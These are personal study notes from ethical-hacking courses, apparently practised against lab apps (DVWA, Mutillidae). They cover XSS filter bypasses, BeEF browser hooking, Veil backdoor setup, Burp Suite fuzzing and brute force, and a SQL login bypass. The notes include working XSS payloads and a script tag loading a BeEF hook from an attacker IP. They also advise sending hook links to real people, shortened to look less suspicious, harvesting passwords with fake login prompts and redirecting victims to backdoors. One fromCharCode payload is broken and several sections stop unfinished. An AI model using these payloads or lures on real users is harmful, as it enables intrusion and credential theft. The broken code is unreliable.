user or the client who is browsing the webpage it is not executing on the server, so even if ur code gives u a reverse shell, the
shell will be coming from the user who is browsing the page and it is not gonna coming from the website, So it works on the target
user.

Their r 3 main types of XSS vulnerabilities ->
1 -> Persistent or Stored XSS // it get stored in the database, so the code we inject stored in the database or into the page, So
							  // that every time any person views that page ur code will be executed
2 -> Reflected XSS // in this the code is only executed when the user runs a specific URL
3 -> DOM based XSS // they results from the javascript code written on the client, So the code will actually be interpreted and
run on the client side without having any communication with the web server, they r dangerous bcz the sometimes the webserver uses
some sort of filters for XSS but the DOM based never gets send to the web server
Ex for DOM based so suppose we use web sites where u put ur username without having to check for the web server etc

Discover Basic XSS -> similar to sql injections u browse through ur target and try to inject any text box or any url that looks
similar to this -> http://target.com/page.php?something=something, so try to inject in url parameters or in text boxes

Go to the dvwa website and set the security as low and then go to topic XSS reflected and put ur name in the text box and it will
say Hello with ur name
So in the text box input the code -> <script>alert("XSS")</script> , then click on Submit
now if u see in the URL it would have also executed it but still we can use this URL like ->
10.0.2.4/dvwa/vulnerabilities/xss_r/?name=<script>alert("XSS")</script>

Discover Advanced Reflected XSS ->
- Go to the dvwa website and then go to topic XSS reflected enter ur name and then inspect the output part by using the browser
  debugger
- Now will see Hello is written and followed by our script code so it is being injected in the same way written in the text box and
that's why it is executed
- Increase the security of dvwa to medium and then go back to XSS reflected and paste the same above code->
 <script>alert("XSS")</script>
- and now u see that it doesn't worked and on inspecting u will see that the <script> and </script> r not being injected in the code
as it is being filtered and that's why the code is not executed
- their r many ways to bypass filters we can use a cheat made by owasp go to link->
 https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
- but here what we gonna do is in the same way like sql injection we will capitalize some letters like this ->
<sCript>alert("XSS")</scRipt> and inject it buy URL or text box and now u will see it is being able to execute bcz the filter must
be searching for "script" string only, some websites also checks for quotes "" also
we can also use for ex ->    // these r included in cheat sheet as well
<a onmouseover="alert('XSS')">XSS link</a>  // here we r injecting code using 'a' tag
<IMG SRC=# onmouseover="alert('XSS')">  	// here we r using javascript event
<IMG SRC=/ onerror="alert('XSS')"></img>    // here we can give the wrong source code and execute it when their is error

- Discovering even more advance Reflected XSS ->
try to exploit the website urself don't always copy and paste it
- Go to mutilladae website then to owasp Top 10 -> A1 Injection -> Javascript Injection -> Password Generator // this page just generates random
passwords for u on clicking of generate
- generate one password and in the URL for the 'username' parameter remove anonymous and put any word and execute it, now the thing to note is
whatever u write in the username parameter in URL is displayed on the web page // now this indicates that their could be XSS vulnerability
- So this time in the URL for the 'username' parameter insert <script>alert('XSS')</script> and execure URL // now u can see the exploit
didn't run but still something went wrong and it shows the code on the page
- now inspect the element on the code displayed and u can see inside the script tag which is inside the blockquote that the code is broken
- why this happen bcz here the app is automatically trying to put the code inside script tag earlier we were putting the code inside the script
tag , So now we know that we don't need the script tag in our injecting code bcz they r already their and also note that the code was actually
inserted inside the quotes "" as like as string
- now in order to exit these quotation marks we need to add one in our exploit code now the code will be like this
-> " ;alert('XSS'); // , here semicolon is indicating the next line, so the alert part will be executed as the another line
- now copy the above code and paste it in the URL in place for the "username" parameter and execute the URL // u will see nothing is happened
but when we click on generate nothing happened so we inspect the code and see that we need to comment the hard coded part also
- So now we use code as -> " ;alert('XSS'); // , here we use '//' to comment the code which is hard coded and execute the URL
- now u can see the code is being able to executed
- now u can share this link with any javascript code u want and that will be executed on the target person

- Discovering Stored XSS ->
The difference between stored and reflected is that in the reflected u have to send the URL to the target for the exploit to run and in stored
XSS the code will actually stored in the database or into the page so any time someone runs that page ur code will be executed, so u do not need
to interact with any user, so it is much more dangerous then reflected XSS

- Go to dvwa website and click on XSS stored tab enter the name and msg then click sign the guestbook and u will see one uneditable text box
appeared with the inputs
- now if u open it from the metasploit machine u will see that the inputs appeared on the above page are also available from the other machine
this is because the input is stored in the DB
to open the web browser page from the metasploit
-> on terminal -> python -m webbrowser "10.0.2.4/dvwa" // then navigate with arrowkeys to reach that page and u will see the same output

- In the dvwa website in the XSS stored inject the code in the message body as -> <script>alert("XSS")</script> //using double quotes is
 mandatory and click then button if u r doing this code insertion from kali and mozilla then it is working fine but on microsoft edge it is
 creating a problem - need to try this from another machine

- u can reset database by going to setup tab and then to click on button Reset database

- Discovering Advance Stored XSS ->
- set the dvwa security as medium ,now the msg text box is not injectable
- in the name text box we have limit of 10 characters only we can by pass it by doing inspect element on text box and then chnage the maxlength
and then enter the code as <sCript>alert("XSS")</scRipt> // we r changing the "script" characters bcz it is actually filtering for string
"script" , then click the sign guestbook button // and then the vulnerability will appear
- now some filers will try to filter the single or double quote to bypass those filters we can use "String.fromCharCode" method and we will
convert the string "XSS" to charcode
- google charcode calculater and use the site -> jdstilles.com and put XSS string and get the charcode , copy that and now the code would be
like this -> <sCript>alert(String.fromCharCode(120.115.115.50))</scRipt> and u will see the exploit worked

- Hooking victims to BeEF Using Reflected XSS
Beef Framework allows us to run large no. of commands to hook browsers and to hook a browser to beef a javascript code has to be executed on that browser
and bcz beef uses JS it's very easy for us to inject that code into XSS vulnerable web pages and that code will be executed every time a person
runs that page
- go to kali linux desktop and run beef, it will automatically start browser for u
- on the left side u will see folder of Online browsers which contains all the browsers which are currently hooked to beef // currently their
 is no browser hooked
 - their r no. of ways that u can use to hook people to beef but currently we will look into XSS vulnerabilities
 - we will currently use the code given to us by beef itself which much similar to alert code we were using as u can see it in the beef opened
 terminal like this -> Hook: <script src="http://<IP>:3000/hook.js"></script>, copy it and modify it with ur own IP lik this
 <script src="http://10.0.2.15:3000/hook.js"></script>
 - go to dvwa set security to low then go to XSS reflected tab and enter the name and get the URL generated after submit click and change the
 URL like this -> http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=Sadanand# change it to this ->
 http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=<script src="http://10.0.2.15:3000/hook.js"></script>#

 now send this URL to any person and once they execute this URL they will be hooked to Beef and then u will be able to run all the cmds that r
 allowed u to run
 use sometype of URL shortening to make the URL less suspisious
 open the new tab in mozilla and execute the URL
 now go to beef control panel in browser// u will see that in online browser the person is hooked

 Hooking victims to beef Using Stored XSS
 - in dvwa go to XSS stored give the name as beef and message as <script src="http://10.0.2.15:3000/hook.js"></script> , if it not allowing u
 to enter more characters then increase the no. of maxlength by doing the inspect element and then click on the button
 - it will not show any thing but now u can send this URL http://10.0.2.4/dvwa/vulnerabilities/xss_s# instead of suspisious one and now u have o just wait for
 people to visit that URL and one they click that URL they will be hooked to ur beef and may be gain full access to the server or the website
 - in the windows vm open the browser and then go to url http://10.0.2.4/dvwa/vulnerabilities/xss_s# but first set the security to low
 and now u will see that the windows machine browser also gets hooked
 - if u click on the hook of the windows machine from the beef browser , u will see the detail tab page which gives u browser information
 and also got to now the platform which is necessary to at the time of creating the backdoors etc, all the data shown in the detail tab page
 comes handy when u try to gain access of the computer such as IP , URL with which it is hooked etc
 - on the logs tab u can see all the events happened so far
 - in the commands tab u can see the list of cmds u can run on the target computer
 - in the rider tab u r allowed to see and create http requests
 - the xssrays tab allows u to discover xss vulnerabilities on the current page
 - the ipec a beef terminal that u can use with commands and interact with beef through it
 - the network tab will give u an overview of current network so it kind of visualize of whole netwprk
 - the webrtc basically allows u to create a network of all browsers that u gained access to and try to hide urself by using peer to peer
  network

- Beef Running basic cmds on victim ->
- after the hook go to the commands tab, choose the cmd u wants to execute in categories already provided to u
- in the search box of commands tab enter -> alert and the options related to them will appear to u, select the option "Create Alert Dialog"
and enter the text u wants to show and then press Execute button
// now on the victim machine u can see the alert appearing
- now search "raw" , choose the option "Raw Javascript" and then enter the code u want such as key logger or the alert etc
such as alert("Alert")
- now search "spy" select the option "spider eye" and after sometime u will be able to see the screenshot of the victim's Desktop
- now search "redirect" select the option "redirect browser" then redirect the user to the URL u want and u can trick them to ask them to
download an update and instead of an update I can put the backdoor

Stealing Credentials/Passwords using a fake login prompt // so baiscally the way it happens it will dim the screen and it will tell the person
that u r logged out so plz log in into ur account again so u can get authenticated and this will allow us to bypass HTTPS and all other security
used by the target account page bcz u know now the username and password of the account
- go to "social engineering" category and then expand it choose the option "Pretty theft" choose the option such as facebook , youtube etc based
on the account u hijacked and then click on execute button
- and when on the command u have just executed u will see the username and password for the account

Veil 3.1 ->
- Veil is a framework which is used for generating Undectable backdoor, link -> https://github.com/Veil-Framework/Veil/
- on the kali terminal do -> cd /opt // opt is a directory where u should install optional software
- git clone https://github.com/Veil-Framework/Veil.git
- cd Veil
note -> veil relies on 3rd party libraries which we first also need to install before running veil
- cd config
- ./setup.sh --silent --force// it will install all the third party libraries which r needed , --silent will run the installed as an unattened installed
so basically it will install every thing with it's default settings and won't ask us to configure anything, --force is u for the case if u have
already installed it will overwrite any existing installation
- if u r in root location then -> cd /opt/Veil
-> ./Veil.py //this will start the Veil
- now u will see the main cmds on the screen such as info, list, update etc
- enter "list" in option then we have to choose option 1 "Evasion" so enter "use 1"


--------------------------------------------------------------------------------------------------------------------------------

- burp-suite-hacking-course-beginner-to-advance Udemy tutorial

Burp Suite needs java run time environment

the proxy's which r provided with the browser does not provide that much alteration in the request like burp suite

it's important to catch the request after it left the browser as it is more reliable information then the http request info coming from the
inside browser

if u wants to intercept the response from the web server using burp suite then go to the -> Burp suite -> proxy tab -> options tab -> to the
heading "intercept server responses" and check the check box of the "intercept responses based on the following rules"
we can also add the rules their for the type of response we wants to intercept

- it's good idea to intercept only the requests and responses which u particularly wants to trap

- Ex to intercept the requests which match the target scope go to the -> Burp suite -> proxy tab -> options tab -> to the heading "intercept
 client requests" -> then check the option with "Relationship" as "is in target scope" and use the up to move the option at top of the priority
 to be matched
 u can edit the requests options to be intercept also by editing the matching conditions, match relationship etc

- for getting the required requests only it is most of the times advised to add the target website in target scope
- now if u don't want to walk through ur site and check every request and responses , u can right click on the site in the target tab under the
site map list of website and slect the option "spider this host"
- now in the spider tab u will be able to see the requests being made and in the options tab under the spider tab u can use the options to control
the spider working , under the heading "Application login" u can control the login forms automation and working
under the heading "Spider Engine" u can define the efficiency for the spider to work
under the heading "Crawler settings" u can define the pages u wants to crawl

Burp also has the vulnerability scanner on going the "Scanner tab" but the automcatically scanner is in the paid version only

- u can send the request from the proxy to other tabs also by going under the proxy tab -> intercept tab -> raw tab -> then right click anywhere
on the raw tab window on selct the tab to which u wants to send the request
- here choose the option for the repeater tab and then turn off the proxy to intercept request, now click on "Go" button and u will be able to
see the response regarding that request
- so we can use the repeater tab to see the request and response outcomes for the request by changing it's attribute values without going to
the browser again and again
- Ex -> go to Owasp top 10 -> A2 Cross Site Scripting (XSS) -> Reflected(First Order) -> PenTest tool lookup  and try the above method for the
repeater tab
- on the right click in repeater tab -> raw tab we also get the option of "Request in browser" by the help of which u can see the recorded on the
browser and it most of the times show wrong output in the render tab but using this option it shows the original output

- now using the repeater like this could be tiring so we can send the request to the intruder tab and we can send it in the same way to the
intruder as we do not need to intercept the request again from proxy tab and then send to intruder
- now inside the intruder tab u will be able to see the Host and port of the attack under the target tab of intruder tab and then under the
Positions tab u can see the whole request and u will see some high lighted area with in $ type of symbols now u can un highlist them by selecting
and then clciking on clear or u can also hightligh something by selcting that thing and clicking on "Add"
- here we selct the options which we wants to change and others will be remain same so it kind of automate the working of repeater tab in
which we need to change the value manually here we can do that automatically
- in the dropdown select the attack type as sniper // as it is going to pick each target and iterate all the test data while chnaging only the
desired field and keeping other things constant
- in the payloads tab u set up the test data as u can also load the file for the test data in the payload type u can select the type such as numbers
and then enter the range for it
 - in the options tab u can set for the matches of the response and other things u desire , under the heading "Grep Payloads" check the option
 "Search responses for payload strings" // it will help of cross site scripting as it show signs for it as u send some kind of code into an
 input field and exactly what u have typed in is reflected back so it is a kind of a critical mistake
 - and then click on the "Start attack"
 - if u have searched for some error , exception or any kind of string it will also show the results regarding that in the pop up window
 - always look for the length section in the intruder result pop up window as this will indicate that if any thing is happened or not as
 it is the length of the characters and more the difference among the length more the different outputs

 - we can also send the request to the comparer tab to get the comparision between two request or two response on the basis of words or bytes
 - right click on the two requests appeared in the result pop up window of the intruder attack and then selct the option "Send to Comaprer (response)"
 and then click on the "words" button and then result window will pop up with the differences

 - we can also use the Sequencer tab for telling the intruder tab action to which field to look at and then on the basis of this send back the
 web server response
 - Ex let's just say u have created a random no. generator and u wants to figure out how random is ur random no. generator , So u could have
 highlight that field and then send 20000 requests and then u can tell how random it is by comparing them
 - Hands on go to mutilladae login page and then send the request of the response to the sequencer tab from the proxy tab
 - and inside the Sequencer tab u will see that under the heading "Token location Within Response" u will see the cookies present in the
 request then click on the button "Start live capture" and then u can check the option of the Auto Analyze or click on analyse now  and see
 the amount of randomness , character level analysis etc

 - Sometimes error occurs when u r using burp suite for the https request sites this occurs bcz the burp also need to send the certificate to
 the website with https but while using the burp it will also create and send the certificate with request but the problem is the certificate is not signed
 by any authority, so u can use the advance action options for that and add certificate for that site, or we can also use the burp authority
 certificate and load that into the firefox, so when in future the burp would generate a certificate and sign it withits own certificate then
 the browser will trust theat certificate and their fore trust the per host certificate.// that's why when u will see the certificate created by
 the burp it will show the organization as PortSwingger
 - for resolving https issue with burp suite ->https://www.udemy.com/burp-suite-hacking-course-beginner-to-advance/learn/v4/t/lecture/13231592?start=225

 - Target Tab -> it is the most important tab bcz the other tabs work in the basis on this tab their jobs
    - the other sites appearead in the "site map" r the sites which r referred to or have their links in the main site
    - the sites often makes the ajax requests in the background outside of their own domain and u will those if in the request and response options
    during the intercept u have selected the option "Is in target scope"

 - Repeater tab -> u can also send the request from the proxy tab -> http history tab to the repeater for the previous requests
 the common usecases for the repeater tab usage r ->
 - to make sure the request is repeatable, their r some cases in which when u bring the request from the proxy to the repeater to replay and u
 find out that they don't work, some sites use request forgery token to make sure to generate one request only and in these cases repeating
 the same request will result in error

 - Spider web application with burp suite -> for the spidering u first need to define that which domain u wants to spider and on the control
 tab using the "use custom option" u can define what u wants to spider
 - one the spidering is complete u can go back to the target tab and the host on which u applied the spider u will find the files and things
 found by the spidering
 - u can also filter the things u wants to see by clicking over the filter tab under the target tab such as click on the checkbox of
 "show only in-scope items"

 - Intruder Sniper to Fuzz Parameters ->
 - go to the mutilladae site and then to login page enter any random username and password , intercept the request using the burp suite and then
 send the request to the intruder tab -> position tab , select the attack type as "sniper" // it means it is going to send the each input into
 the highlighted fields, then go to payload tab and enter ur payloads to attack the request

 - Intruder mode sniper, battering-ram ,Pitchfork, cluster bomb ->
 - Battering ram works in the same way like sniper except it tries the words in all the fields in same time means the both the payloads will
 have the same input Ex-> username and password will hve the same input root
 - Pitchfork -> it will line up the values of the wordlist for the payloads such as if the first string of the 1st wordlist is admin and the first
 string of the 2nd wordlist is password it will use admin in payload 1 and password in payload 2
 - clusterbomb -> in this all the combinations of the values in wordlist 1 will be tried with values in the wordlist 2

 Burp Suite Intruders tab "Grep Extract" Feature ->
 - send the request to the repeater to check that the request is repeatable and then send it to the intruder then in the positions tab , clear
 the unwanted values and highlit the values u want, in the payload selct the payload type as "character frobber" // the way it works is that
 it increase one letter at a time in the string such as it increase the 6 to 7, b to c and so on and the results send back will we in the
 basis on these chracter frobber generated inputs for the different fields, then go to the options tab
 then to Grep Extract heading and inside it click 'add' , and then select the value from the HTTP page and then click 'ok' and then start the
 attack
 https://www.udemy.com/burp-suite-hacking-course-beginner-to-advance/learn/v4/t/lecture/13232064?start=0

 Fuzzing Web appilcation with Burp Suite Intruder ->
 Fuzzing includes to send the random input to an application for fault injecting, robustness testing, syntax testing and negative testing, we r
 looking for something out of ordinary such as application crash, server error, exception etc and if u find it then we can use that invalid
 input which is causing trouble to to different things such as Denial of Service etc
 - go on the mutilladae website then to user info page of the mutilladae
 - send the request to the repeater tab, replay the request to make sure it still works, then send it to comparer tab and then change the page
 parameter of the URL with the page value which doesn't exist and run it in the repeater tab and send this one to the comparer tab also ,
 see the difference between the two requests on the basis of the words
 // this could be usefull in detecting the difference between 2 types of pages
 - now send the correct page request to the intruder tab
 - then clear other parameter and hightlight the page name only like this -> "home" not the full name "home.php" as all the pages will end in
 ".php"
 - and use the attack type as "sniper" and setup the payload
 - we can use the Grep Extract and Grep Match for the fuzzing purposes, such as we can add the string "Validation Error 404 - Page Not Found"
 which we find out during the comparer tab of the wrong page
 - here we r testing for the negative conditioning
 - now u can start the attack and in the pop up window u will find all the results
 - now if see the page with too much length in comparision of others then it could also be a hidden page

- Burp Suite Sequencer to Compare the CSRF tokens strength ->
- set the mutilladae security to level 1, then delete all the cookies using cookie manager
- enter the value in the URL parameter page = add-to-your-blog.php
- intercept the page using the burp suite then send the request to sequencer and then turn the intercept off
- then go to "custom location" option under the "Token location within Response" , then search for the csrf-token, then select the value inside
the value attribute of the tag which is "SecurityIsDisabled" then click "ok" and then "start live capture",
- we will be need about 100 to 200 tokens for the analysis , pause when u get them and then click on "analyse now"
- if in the "overall result" section the "effective entropy" is 0 then that means the tokens r not random at all
- now stop the analysis and change the security level and set the security level to 5 and do the above process again
- now in the "overall result" section the "effective entropy" is not zero then that means the tokens r random and this indicates this is very
 strong token

 - Local File Inclusion using burp suite ->
 - go to mutilladae -> A4- Insecure direct object references -> text file viewer
 - the developers have developed this page of thinking that these r the only possible options which the user can use in the dropdown
 - on intercepting the request we can see that in the parameter "textfile" their is the reference to the file and this is the insecure
 direct object referrence , edit the parameter value to "index.php" and actually we r here able to dump the source code from the website
 to see the code

 - SickOS -> https://www.udemy.com/burp-suite-hacking-course-beginner-to-advance/learn/v4/t/lecture/13232114?start=0

 - Owasp ZAP -> https://www.udemy.com/burp-suite-hacking-course-beginner-to-advance/learn/v4/t/lecture/13232122?start=0

cross-site-scripting-xss-website-hacking-course Udemy tutorial ->

- Normally the sites more or less runs independently within the browser and the site's r not allowed to look at each other's information like
the web storage cookies or DOM of each other and cross site scripts is basically violating the same policy

- So what is happening is the script is getting incorporated itself in to the web page, so that the web page is served the script is embedded
in the web page and their fore it is the violation of SOP

- Open the mutilladae website and in the page parameter enter dns-lookup.php

- when we enter the random string inside the hostname/Ip input box and press lookup DNS button u will see it has returned the page with the
 input string so actually the string becomes the part of the web page to verify this right click on the page to inspect element and look for the
 source and u will find the input word in the page

 now enter the small script <script>alert(document.cookie)</script> and it will return the cookie and on inspect element the page u will find
 that the entered script has become the part of the web page and this happened before the page page even transmitted back to browser

 DOM Based Cross Site Scripting -> in this the injector script never actually goes back to the server, it actually stages in the browser
 entire time

 - Open the mutilladae website and in the page parameter enter html5-storage.php
 - now enter any random string in the key and the item input boxes and then click on "Add new" button , now u will will see that the input is
 displayed on the browser but here it has nothing to do with the web server as the input is displayed as it is added to the page by the JS
 now on the basis if the code standards if we view the source code of the page by inspect element we will be able to see that the developer
 has used the 'innerhtml' which makes it vulnerable to the 'XSS' instead the developer should have used the 'innertext'

 - now if in the input box we enter <h1>Hello</h1> and it will allowed to be add in the page and u will also see that the browser is showing
 the Hello in big words bcz the browser is confused as the browser cannot tell the difference between the data and the <h1> tags

 Reflected Cross Site Scripting -> in this the script is entered into the page but it's gonna travel over to the web app server

 - Open the mutilladae website and in the page parameter enter dns-lookup.php
 - intercept the packet , now u will see that the target_host parameter has our input string value and also intercept the response and in the
  response intercepted request u can see the input value
  - Reflected Cross Site Scripting bcz the web application acts like a mirror , the input leaves the browser goes back to the application the
   application incorporates the input into the resulting output page and it comes back to the browser
- Ex - now enter the small script <script>alert(document.cookie)</script> and it will return the cookie and on inspect element the page u will find
 that the entered script has become the part of the web page and this happened before the page page even transmitted back to browser

Stored Cross Site Scripting ->
- Open the mutilladae website and in the page parameter enter add-to-your-blog.php
- enter the random string in the text box and u will see that the input is displayed on the web page which is returned from the server
- now enter the script <h1>Hello</h1> and it will get injected
- now this injected scripted will be get stored in the database itself and any user that views that page will end up seeing this information
because now every user which is pulling this page will got the data from the database of the page too

- Open the mutilladae website and in the page parameter enter view-someones-blog.php then choose the option of show all from dropdown and
u will see that the result is showing the data entered on the previous page

Discoverig Cross Site Scripting -> the cross site scripting is not just limited to HTML recently it is also seen in the JS and xpath as the
developers often forget to put the encoding in JS, Xpath, XML, Jquery etc
- Open the mutilladae website and in the page parameter enter dns-lookup.php
- when we enter the random string inside the hostname/Ip input box and press lookup DNS button u will see it has returned the page with the
 input string

HTML Events Using XSS ->
 - Open the mutilladae website and in the page parameter enter dns-lookup.php
 - intercept the packet , now u will see that the target_host parameter has our input string value
 - now in the referer param of the request we change its input with script like this -> <"+=">
 - this referer value comes from the back button code of the page we can see that by inspect element
- now we have to see how the server respond to our input as on the response page we can see that the back button refrrer URL is replaced by
our input
- send the request again with random string
- intercept the packet , now u will see that the target_host parameter has our input string value
 - now in the referer param of the request we change its input with script like this -> ';alert(1);//
- now on the website if I click back button we can see the alert appearing

Cookie Hijacking using XSS ->
- go to the mutillade login page then to preferrence then search for cookies manager and then delete all the cookies present
- now enter username and password as admin and adminpass
- intercept the response of the request now in the headers tab for the param set-cookie u will see u r provided with username and uid one of
them r HTTPOnly cookie but they don't have HTTP only at the end
- Open the mutilladae website and in the page parameter enter view-someones-blog.php then choose the option of show all from dropdown and
u will see that the result is showing the data entered on the previous page
complete the task in it -> https://www.udemy.com/cross-site-scripting-xss-website-hacking-course/learn/v4/t/lecture/13230248?start=75
- toggle the security to level 5 and go to the login page
- now enter username and password as admin and adminpass
- now turn the security level to 0 again
- intercept the response of the request now in the headers tab for the param set-cookie u will see u r provided with username and uid but
 this time they have the httponly flag at the end of them
 - and if this time we try to access the cookies we will see that the uid and username flags r not displayed in the vulnerabilities,
 - this is bcz now the httponly flag forbids the browser that the JS attempts to access the cookies the browser should not return a value
- * this part for the filetering concept is not done

Java String Injection ->
- Open the mutilladae website and in the page parameter enter password-generator.php&username=anonymous
- on the first look it is not clear that whether the page is JavaScript injectible or not
- open the burp suite , intercept the request and then send it to repeater tab click on Go send the request to the comparer tab
- now on the repeater tab change the username from anonymous to canary and in the respnonse the raw tab search for canary and u can see that it
is inside the string quotations
- send this canary request to comparer tab also and on comparing the two response we will see that the only difference is word canary
- so this means whatever is passed in the username param of the request it is injected in to the web page as String, so that means it is a
good condidate for injection
- now we need to test out that if the website is gonna encode special characters that we will like to use over the payload
- now on the repeater tab change the username from canary to <canary();/**////> and in the respnonse the raw tab search for canary and u can see that it
is inside the string quotations that noting is changed wahtever u put in the username param
- now on the repeater tab change the username from canary to ";}catch(e){};alert(0);try{ a="   // this "} is used to close the brackets which come inbuilt with
the repsonse page and to also handle the existing try catch statement
- we may also need to encode that above statement so that the web server will be able to parse the HTTP request, if u get the status code of
500 or some kind of server error or bad request error this means the encode cannot pass the web server
- now go to the decoder and change -> ";}catch(e){};alert(0);try{ a="  to the URL
- copy the changed string and put it in the username param of the starting request on the browser
- and u will see that the injection works and alert came
- ";}catch(e){};alert(0);try{ a=" -> here the payload is only alert(0) others r for the web page JS alteration as we cannot use the // or /**/
effectively that's why we had to inject try and catch handling also

CSS String Injection ->
- Open the mutilladae website and in the page parameter enter set-background-color.php
- instead of entering any color enter a string -> canary
- then inspect the page source seacrh for canary and u will find it
- now on view the page source we can see that we have to apply some prefix and suffix to eleimate the quotes in the code and tags
- so enter now "><script>alert('XSS in the style')"</script><span" and then click on the button

Path Relative StyleSheet injection ->





Insure Session Management -> here we will try to bypass login as a admin without a password and manipulating cookies , this can't be done always
as possible only when the session management is programmed that way that it can easily bypassed, look for cookie editor firefox on google and
add it to browser

- cookies r used to authenticate the users after login, as every time u go to different page u don't need to login, cookies have date of expiry
- login using ur credentials in mutilladae , then to OWASP TOP 10 -> A3 - Broken Authentication... -> Cookies -> then click on top bar for the
option View log
- click alt on the browser to display extra options





Hacker' Sploit Burp Suite ->
   In the HTTP History tab of Proxy Tab we can see the list if the sites accessed so far.

   Spidering WIth Burp Suite -> Purpose of Spidering is to identify our scope, so it is process of mapping out our web application, it is useful
   in find links and web forms as it allow us to attack web forms manipulate headers, their is automaticatic spidering also in burp suite which
   identify files,folders and forms from the web application and it will record all records and responses while performing the whole spidering
   process

   - Go to the spider tab then to the control tab, in the spider scope section u define the target
   - in the options tab if passive spidering is on then that means that the spidering will be continuing even when we r looking into the web app
   - in the request headers sections u can manupulate the headers
   - in the crawler settings we can specify that what the spider have to crawl for such as "robots.txt" file etc , the maximum link depth is the
   number of links which u want spider to crawl or to map, more the links r their more the load is their on application
   - in the control tab, in the spider scope section select option use custom scope and selct the checkbox of advance scope
   - go to the mutilladae website and start the burp suite and turn of the intercept in proxy
   - now if u go to the target tab then in the Site amp tab u will find the IP of the metsploit and u will see the mutilladae, site map tells the
   structure and format of the web page and how web page was constructed and how it will function
   - on the mutilladae folder right click and selct the option add to scope // scope allows to define our automatic spidering which means on what
   target we wants to focus and then click yes
   - spidering stores all the files , links and methods etc it can get which gives us the idea of how the web application is structured and how
   it works
   - now again go to the target tab then in the Site amp tab u will find the IP of the metsploit and u will see the mutilladae right click on it
   and then selct the option spider this branch and u will see that in the site map tab it will start getting all the links it can and give a
   modal of the submit form now u can ignore these forms right now by clciking on the ignore form button as these forms might we the initial forms
   such as login etc
   - now to see the status of the spidering got to the spider tab and u can see the requests made and the bytes transfered no go to the options tab
   and then go to application login section and select the option -> automatically submit these credentials and now u can enter the username
   and password if u know them otherwise use -> admin' or 1=1 -- in username box and leave the password box empty
   - now go back to target tab and then again to the site map and then to mutilladae and right click selct option spider this branch and then
   stop it if it is not doing anything
   - expand the mutilladae folder and u can see the structure of the web application and get the idea of the website
   - as burp suite community addition does not allow the feature to find the hidden files , so we will use and alternate program ZAP
   - click on the Filter bar to get the only required output then selct the option "Show only in-scope items" and it will show the data accordingly

   Discover the hidden files with ZAP(Zed Attack Proxy) ->
    - OWASP -> It is a non-profit arganization who's goal os to improve the security of software
    - link for ZAP -> https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
    - So hidden files could also be considered as the files which the developer has not configured corrently or which give away some crucial
    information
    - to start zap on the attacker machine run cmd -> zap.sh
    - we will try to find hidden files in mutilladae website for demo
    - open the zap go to the options  and then in the opened small model go to local proxies and then change the port no and IP address according
    to u
    - now on relading the mutilladae website from the browser u will observe that some folders have apperaered in ZAP proxy  under the sites section
    on the left bar and u will also see the one GET request file and other folders such as images etc option their on expanding the folder
    - in the history section of the ZAP u will be able to see all the logs of the requests which have been made and also see the alert types
    , status code etc
    - right click on the mutilladae folder then go to attack option and then to spider option and click start scan
    - after the scanning is completed then u go to the mutilladae folder and u will see much more hidden files have appeared and discovered
    - now again go to the mutilladae folder and then right click then to attack and then to force browser directory and children
    - now go to the forced browse tab and then select the site and the list from the dropdowns ,this list file will be used in kind of a brute
    force
    - now again go to the mutilladae folder and then right click then to attack and then to force browser directory and children
    - now u can see the more hidden files and folders r being explosed as the  force browser directory and children is scanning on
    - now u will see a notes folder has appearead which has one file as 'GET:passwords'
    - now right click in that file and selct the option cpy URL to clipboard and paste it in the browser
    - u can also go to the alerts tab which already shows some of the explosed vulnerabilities such as cookies etc
    - u can see the GET:robots.txt file from the list of the hidden files then u can right click on it and then select the option of
    Copy URLSs to clipboard and paste it in the browser and u can see the accounts file appearing over their and on opening that file
    u will see multiple credentials and same way u can copy the images folder URL and paste it in the browser to see the images and icons
    resent in the project and same way under the passwords folder u will get the GET:register file or under the register folder u can
    go to the GET:set-up-database.php

    Wordpress vulnerability Scanning & Username enumeration ->
    -

   Brute Force->
   - Go to dvwa website then to brute force tab and then enter any wrong username and password and u will get the msg accordingly
   - make sure that in the proxy tab the intercept is on and after the request is intercepted we need to send the request to the intruder tab
   of burp suite, by right click on request and selct the option intruder and then het forward as we don't need that request any more
   -now in the intruder tab go to the positions tab and u will see the request which was intercepted
   - now hit the clear button on the right side at top not at bottom // as we r going to selct the values for brute force manually
   - in the "attack type" dropdwon select the cluster bomb attack type we r using it because here we r doing brute force on two values as these
   both values r needed to be tested aginst the login form
   - now selct the value in username which is currently test and then click on add and do this for the password value same
   - now go to the payloads tab and set the payload set as 1(this is for username) and payload type as simple list and in the payload options
    section and then in the Add section of the payload options enter any common username such as admin then click Add button then enter administrator
    in same way and click add, then root , test etc which u can think of and if u know the username then it's even better
   - u can even use the wordlist u just have to click on the load option of the payload options and load ur wordlist file
   - we can use the default word list which comes with kali linux for that we can load it form root/usr/share/wordlists/metasploit and select the
   wordlist file which u wants to use
   - now go to the payloads tab and set the payload set as 2(this is for password) and payload type as simple list and in the payload options
    section and then in the Add section of the payload options enter any common username such as pass then click Add button then enter password
    in same way and click add, then root , admin ,12345 etc which u can think of and if u know the username then it's even better
    - now go to the intruder on the top most tab of burp suite and select option start attack and then click OK
    - now on the window appeared after starting the attack u need to check for the length codes or numbers for the two payloads
    - if the length code is different then the others then it could be the valid username and password such here the length code for the
    payload1 -> admin and payload2 -> password the lenght code is 4942 but for the others it is 4882
    - now if we click of that length code then a new tab will appear and in that tab go to response and then go to render to see that what
    kind of output for the page is send from the server
    - these days most websites have security plugins which prevent u from brute force but most of the older sites login forms r not protected
    form brute force


 - look into the this playlist



------------------------------------------------------------------------------------------------------------------------------

- Shodan.io ->
it is a search engine use to find devices which r connected over the internet, So we can find the IOT devcies like webcams, routers
etc.  Now Google finds webpages were as Shodan try to find devices which r connected over the public IP addresses  
- HTTrack is a software which is used to copy the entire content of the website including JS, CSS and HTML pages offline, and once
they r copied we can host our website into our localhost server. 
- Nmap Scripting engine is the feature of nmap, we can also use pre-written scripts, this tool came in VAPT tool which is vulnebilites
assessment 

-------------------------------------------------------------------------------------------------------------------

- NoSQL Injection ->

- It is introduced when developers create dynamic queries that include user supplied input(untrusted input)

- Types of input types could be recieve->
- binary and hex
- strings(code), ints(numbers)	// this is when the developer is blindly ascepting the input
- Query Object 
- Others

In mongodb 'username: username_value' the username_value is mapped with username hence like in sqli we cannot use the 
comments to ignore the stetement after it 

MongoDB represents queires as BSON objects(Binary JSON) which does not behave like string thus traditional SQL injection
